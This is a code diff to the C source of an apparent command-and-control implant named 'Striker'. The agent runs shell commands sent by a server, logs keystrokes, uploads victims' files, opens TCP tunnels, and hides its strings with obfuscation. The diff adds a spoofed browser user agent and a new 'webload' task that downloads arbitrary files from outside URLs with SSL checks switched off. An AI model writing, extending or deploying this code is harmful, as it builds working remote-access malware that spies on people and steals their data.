@@ -49,6 +49,9 @@ char AUTH_KEY[sizeof(char) * 33] = "[STRIKER_AUTH_KEY]";
 char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]";
 char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]";
 
+// HTTP user agent
+char STRIKER_USER_AGENT[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";  
+
 // Some globals for the keylogger.
 short keymon_active = 0;
 #ifdef IS_WINDOWS
@@ -196,8 +199,7 @@ int http_get(char *url, buffer *body){
     free(target_url);
     return rsp_code;
   #else
-    char userAgent[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";
-    HINTERNET hInternet = InternetOpenA(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     HINTERNET hResponse = InternetOpenUrlA(hInternet, target_url, "", 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
     free(target_url);
     if (!hResponse){
@@ -225,8 +227,8 @@ int http_get(char *url, buffer *body){
 
 int http_post(char *url, cJSON *data, buffer *body){
 
-  char strs[][70] = {"[OBFS_ENC]Content-Type: application/json", "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)", "[OBFS_ENC]POST"};
-  for (int i = 0; i < 3; i++)
+  char strs[][42] = {"[OBFS_ENC]Content-Type: application/json", "[OBFS_ENC]POST"};
+  for (int i = 0; i < 2; i++)
     obfs_decode(strs[i]);
   char *target_url;
   if (url[0] == '/'){
@@ -281,9 +283,9 @@ int http_post(char *url, cJSON *data, buffer *body){
     URL_PROTO urlProto;
     parse_url(target_url, &urlProto, urlHost, &urlPort, urlPath);
     char *postData = cJSON_PrintUnformatted(data);
-    HINTERNET hInternet = InternetOpenA(strs[1], INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, strs[2], urlPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, strs[1], urlPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
     if (!HttpSendRequestA(hRequest, strs[0], strlen(strs[0]), postData, strlen(postData))){
       #ifdef STRIKER_DEBUG
       fprintf(stderr, "[-] Error making POST request to: %s\n", target_url);
@@ -327,6 +329,44 @@ int http_post(char *url, cJSON *data, buffer *body){
   }
 
 #endif
+
+int web_download(char *url, FILE *wfo){
+
+  #ifdef IS_LINUX
+    CURL *curl = curl_easy_init();
+    if (!curl){
+      return 1;
+    }
+    // We don't really need secure SSL for agent downloads (I think :)
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
+    CURLcode res = curl_easy_perform(curl);
+    return (res != CURLE_OK);
+  #else
+    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hResponse){
+      InternetCloseHandle(hInternet);
+      return 1;
+    }
+    DWORD dwBlockSize = 1024 * 50;
+    DWORD dwBytesRead;
+    char *buff = malloc(dwBlockSize);
+    while (InternetReadFile(hResponse, buff, dwBlockSize, &dwBytesRead)){
+      if (!dwBytesRead)
+        break;
+      fwrite(buff, 1, dwBytesRead, wfo);
+    }
+    free(buff);
+    InternetCloseHandle(hResponse);
+    InternetCloseHandle(hInternet);
+    return 0;
+  #endif
+}
 
 cJSON *sysinfo(){
 
@@ -414,8 +454,8 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
       buffer_strcpy(result_buff, strs[2]);
       return 1;
     }
-    char form_strs[][76] = {"[OBFS_ENC]----WebKitFormBoundary", "[OBFS_ENC]Content-Type: multipart/form-data; boundary=", "[OBFS_ENC]\r\nContent-Length: ", "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)", "[OBFS_ENC]\r\nContent-Disposition: form-data; name=\"file\"; filename=\"", "[OBFS_ENC]\"\r\nContent-Type: application/octet-stream\r\n\r\n"};
-    for (int i = 0; i < 6; i++)
+    char form_strs[][76] = {"[OBFS_ENC]----WebKitFormBoundary", "[OBFS_ENC]Content-Type: multipart/form-data; boundary=", "[OBFS_ENC]\r\nContent-Length: ", "[OBFS_ENC]\r\nContent-Disposition: form-data; name=\"file\"; filename=\"", "[OBFS_ENC]\"\r\nContent-Type: application/octet-stream\r\n\r\n"};
+    for (int i = 0; i < 5; i++)
       obfs_decode(form_strs[i]);
     char *token = random_str(16);
     char *boundary = malloc(50);
@@ -431,17 +471,17 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
     int urlPort = 0;
     char *urlPath = malloc(MAX_URL_PATH_LEN);
     parse_url(url, &proto, urlHost, &urlPort, urlPath);
-    HINTERNET hInternet = InternetOpenA(form_strs[3], INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA(STRIKER_USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     HINTERNET hConnect = InternetConnect(hInternet, urlHost, urlPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
 
     char *formDataPrefix = malloc(1024);
     strncpy(formDataPrefix, "--", 1024);
     strncat(formDataPrefix, boundary, 1024 - strlen(formDataPrefix));
-    strncat(formDataPrefix, form_strs[4], 1024 - strlen(formDataPrefix));
+    strncat(formDataPrefix, form_strs[3], 1024 - strlen(formDataPrefix));
     char *basename = get_basename(filename);
     strncat(formDataPrefix, basename, 1024 - strlen(formDataPrefix));
-    strncat(formDataPrefix, form_strs[5], 1024 - strlen(formDataPrefix));
+    strncat(formDataPrefix, form_strs[4], 1024 - strlen(formDataPrefix));
 
     char *formDataSuffix = malloc(100);
     strncpy(formDataSuffix, "\r\n--", 100);
@@ -471,50 +511,6 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
     buffer_strcpy(result_buff, obfs_decode(msg));
     return res;
   #endif
-}
-
-short int download_file(char *url, FILE *wfo, buffer *result_buff){
-
-  #ifdef IS_LINUX
-    CURLcode res;
-    CURL *curl = curl_easy_init();
-    #ifdef INSECURE_SSL
-      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-      curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-    #endif
-    curl_easy_setopt(curl, CURLOPT_URL, url);
-    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, body_downloader);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, wfo);
-    res = curl_easy_perform(curl);
-    curl_easy_cleanup(curl);
-    if (res != CURLE_OK){
-      buffer_strcpy(result_buff, curl_easy_strerror(res));
-      return 1;
-    }
-  #else
-    char userAgent[] = "[OBFS_ENC]Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)";
-    HINTERNET hInternet = InternetOpenA(obfs_decode(userAgent), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    HINTERNET hResponse = InternetOpenUrlA(hInternet, url, "", 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!hResponse){
-      InternetCloseHandle(hInternet);
-      return 1;
-    }
-    DWORD dwBlockSize = 1024;
-    DWORD dwBytesRead;
-    char *buff = malloc(dwBlockSize);
-    while (InternetReadFile(hResponse, buff, dwBlockSize, &dwBytesRead)){
-      if (!dwBytesRead)
-        break;
-      fwrite(buff, 1, dwBytesRead, wfo);
-    }
-    free(buff);
-    InternetCloseHandle(hResponse);
-    InternetCloseHandle(hInternet);
-  #endif
-  char msg[] = "[OBFS_ENC]File uploaded successfully!";
-  buffer_strcpy(result_buff, obfs_decode(msg));
-  return 0;
 }
 
 void keymon(session *striker, task *tsk){
@@ -881,15 +877,15 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     struct addrinfo *server_addr, client_addr;
     sock_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (sock_fd == -1){
-      free(lport_str); free(rport_str);
+      free(lport_str);
       return 1;
     }
     if (getaddrinfo(lhost, lport_str, NULL, &server_addr)){
-      free(lport_str); free(rport_str);
+      free(lport_str);
       return 1;
     }
     if (bind(sock_fd, server_addr->ai_addr, server_addr->ai_addrlen)){
-      free(lport_str); free(rport_str);
+      free(lport_str);
       freeaddrinfo(server_addr);
       return 1;
     }
@@ -1082,6 +1078,8 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
     fd_set client_set, server_set;
     struct timeval timeout;
     int n = 0, status;
+    size_t block_size = 1024 * 50;
+    char *buffer = malloc(block_size);
     while (!(striker->abort || tsk->abort)){
       timeout.tv_sec = 0;
       timeout.tv_usec = 5000;
@@ -1110,11 +1108,10 @@ int tcp_tunnel(session *striker, task *tsk, char *lhost, int lport, char *rhost,
         write(client_fd, buffer, n);
       }
     }
-    end:
-      close(server_fd);
-      close(client_fd);
-      free(buffer);
-      pthread_exit(NULL);
+    close(server_fd);
+    close(client_fd);
+    free(buffer);
+    pthread_exit(NULL);
   }
 #endif
 
@@ -1258,8 +1255,8 @@ DWORD WINAPI task_executor(LPVOID ptr)
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge"};
-  for (int i = 0; i < 11; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd", "[OBFS_ENC]kill", "[OBFS_ENC]tunnel", "[OBFS_ENC]bridge", "[OBFS_ENC]webload"};
+  for (int i = 0; i < 12; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -1285,7 +1282,7 @@ DWORD WINAPI task_executor(LPVOID ptr)
     pclose(proc);
     tsk->successful = 1;
   }else if (!strcmp(tsk->type, cmd_strs[1])){ // Upload a file to the server.
-    char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s"};
+    char strs[][40] = {"[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]%s/agent/upload/%s/%s"};
     for (int i = 0; i < 3; i++)
       obfs_decode(strs[i]);
     char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
@@ -1295,15 +1292,15 @@ DWORD WINAPI task_executor(LPVOID ptr)
       goto complete;
     }
     char *url = malloc(URL_SIZE);
-    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid) < 0)
+    if (snprintf(url, URL_SIZE, strs[2], BASE_URL, striker->uid, tsk->uid) < 0)
       abort();
     if (!upload_file(url, filename, rfo, result_buff))
       tsk->successful = 1;
     fclose(rfo);
     free(url);
   }else if (!strcmp(tsk->type, cmd_strs[2])){ // Download a file from the server.
-    char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s", "[OBFS_ENC]Error writing file: "};
-    for (int i = 0; i < 5; i++)
+    char strs[][50] = {"[OBFS_ENC]fileID", "[OBFS_ENC]name", "[OBFS_ENC]%s/agent/download/%s", "[OBFS_ENC]%s%s", "[OBFS_ENC]Error writing file: ", "[OBFS_ENC]File downloaded!", "[OBFS_ENC]Download failed!"};
+    for (int i = 0; i < 7; i++)
       obfs_decode(strs[i]);
     char *fileID = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[0]));
     char *name = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, strs[1]));
@@ -1312,8 +1309,12 @@ DWORD WINAPI task_executor(LPVOID ptr)
       abort();
     FILE *wfo = fopen(name, "wb");
     if (wfo != NULL){
-      if (!download_file(url, wfo, result_buff))
+      if (!web_download(url, wfo)){
+        buffer_strcpy(result_buff, strs[5]);
         tsk->successful = 1;
+      }else{
+        buffer_strcpy(result_buff, strs[6]);
+      }
       fclose(wfo);
     }else{
       append_buffer(result_buff, strs[4], strlen(strs[4]));
@@ -1399,6 +1400,20 @@ DWORD WINAPI task_executor(LPVOID ptr)
     tcp_bridge(striker, tsk, host1, port1, host2, port2);
     buffer_strcpy(result_buff, obfs_decode(strs[4]));
     tsk->successful = 1;
+  }else if (!strcmp(tsk->type, cmd_strs[11])){
+    char strs[][30] = {"[OBFS_ENC]url", "[OBFS_ENC]file", "[OBFS_ENC]Error opening file!", "[OBFS_ENC]File downloaded!", "[OBFS_ENC]Download failed!"};
+    char *url = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[0])));
+    char *filename = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[1])));
+    FILE *wfo = fopen(filename, "wb");
+    if (!wfo){
+      buffer_strcpy(result_buff, obfs_decode(strs[2]));
+    }else{
+      if (web_download(url, wfo))
+        buffer_strcpy(result_buff, obfs_decode(strs[4]));
+      else
+        buffer_strcpy(result_buff, obfs_decode(strs[3]));
+      fclose(wfo);
+    }
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -1433,6 +1448,7 @@ void start_session(){
   queue *base_addrs = queue_init(100);
   obfs_decode(BASE_URL);
   queue_put(base_addrs, strdup(BASE_URL));
+  obfs_decode(STRIKER_USER_AGENT);
   char strs[][50] = {
     "[OBFS_ENC]/tmp/", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
     "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key", "[OBFS_ENC]delay", "[OBFS_ENC]redirectors"};
